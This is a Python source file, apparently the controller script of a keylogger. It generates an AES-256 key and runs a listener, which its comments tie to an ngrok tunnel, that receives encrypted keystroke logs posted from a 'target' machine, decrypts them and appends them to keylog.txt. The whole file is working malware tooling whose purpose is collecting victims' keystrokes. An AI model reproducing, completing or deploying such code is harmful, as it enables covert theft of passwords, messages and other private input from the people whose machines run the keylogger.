import os.path
import sys
import argparse
from decryption import *
from collection import *
from key_generation import *

def main():

    # Argument parser to accept an execution mode

    parser = argparse.ArgumentParser(description='Companion script to generate AES keys and listen for incoming keylogs')
    parser.add_argument('-m','--mode', dest='_execution_mode', type=str, help='execution mode')
    args = parser.parse_args()
    execution_mode = args._execution_mode

    # Main script logic is an if loop based on selected execution mode

    # Checks if execution mode is empty...it's required

    if(execution_mode is None):

        print(f'\n[-] You must enter an execution mode!\n')
        exit()
    
    # If execution mode is keygen, then call the key generation method in key_generation.py

    elif(execution_mode == "keygen"):

        print("\n[+] Your new AES-256 key is: " + get_aes_256_key() + "\n")
        print("[!] Please save this key as it will be required to decrypt the keylogs from the target!\n")

    # If execution mode is server, then get the AES key generated earlier and begin collecting/decrypting 
    # incoming keylogs on port 80 (ngrok tunnel)

    elif(execution_mode == "server"):

        hex_key = input("\nPlease enter your 256-bit AES key: ")

        print("\n[+] HTTP Server has started!\n")
        print("[!] Ready to recieve log files...\n")
        print("[!] Please do not close this script or lose internet connection!\n")

        # Infinite while loop for continuous listening

        while(True):

            # Every character in the raw post data from the target was seperated by a space for some reason, so
            # this for loop takes care of that

            clean_request_data = ""
            for char in get_raw_post_data():
                if(ord(char) != 0):
                    clean_request_data += char

            # Seperate http part of the request from the actual data

            seperated_request_data = clean_request_data.split('data=')
            encrypted_data = seperated_request_data[1]

            # Grab the hex initialization vector (32 chars) appended to the end of the posted data

            hex_iv = encrypted_data[len(encrypted_data)-32:len(encrypted_data)]

            # Grab the hex encrypted key log which is everything before the hex iv at the end

            encrypted_log = encrypted_data[0:len(encrypted_data)-32]

            # Send encrypted key log, encryption key, and iv to the decrypt function in decryption.py

            decrypted_log = str(decrypt_data(encrypted_log, hex_key, hex_iv))
        
            # Clean up the byte array indicators

            decrypted_log = decrypted_log.replace("b'","")
            decrypted_log = decrypted_log.replace("'","")

            # Create a file and write the decrypted log to it

            keylog_file = open('keylog.txt', 'a')
            keylog_file.write(decrypted_log)
        
            keylog_file.write('\n')
            keylog_file.write('\n')

            # Give the OK

            print("[+] Keylog recieved, data written to keylog.txt!\n")

if __name__ == "__main__":
    main()